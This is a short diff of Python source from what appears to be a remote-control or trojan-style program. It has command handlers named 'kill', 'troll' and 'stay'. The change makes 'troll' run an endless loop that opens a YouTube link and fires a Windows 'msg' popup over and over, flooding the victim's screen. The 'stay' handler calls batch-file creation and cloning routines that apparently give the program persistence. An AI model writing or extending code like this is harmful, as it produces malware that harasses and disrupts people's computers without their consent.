@@ -65,9 +65,9 @@ while True:
         kill()
     if cmd == "troll":
         link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
-        os.system("msg %username% lol")
         while True:
-            webbrowser.open_new(link)        
+            os.system("msg %username% lol")
+            webbrowser.open_new(link)
     if cmd == "stay":
         bat_create()
         clone()
